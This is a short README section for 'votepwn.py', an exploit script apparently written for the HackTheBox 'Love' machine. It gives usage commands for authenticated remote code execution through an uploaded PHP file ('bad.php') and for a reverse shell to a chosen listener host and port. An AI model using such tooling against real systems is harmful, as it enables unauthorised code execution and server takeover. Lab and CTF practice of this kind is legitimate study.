## Usage
- Remote code execution
```bash
python3 votepwn.py -rce -u <username> -p <password> 
```
User can use any kind of command since it will be b64 encoded by the python script and decoded by the php script, as I'm writing this sentence I'm realising that it might've been better to url encode so user can curl or whatever, I'll check it out.
- Reverse shell
```bash
python3 votepwn.py -rs -u <username> -p <password> -lh <lhost> -lp <lport>
```
**Notes:**

Filename is 'bad.php' by default, can be changed with -file/--filename <name>

Listen port is 4444 by default

## Testing
These tests were made in HackTheBox - Love (Easy) 
- **Remote code execution**
![A gif goes here](https://media.giphy.com/media/D5lnkh2ImOIQVjluM1/giphy.gif)
- **Reverse shell**
![A gif goes here](https://media.giphy.com/media/YcJUBgmKhPD4mvM2HK/giphy.gif)
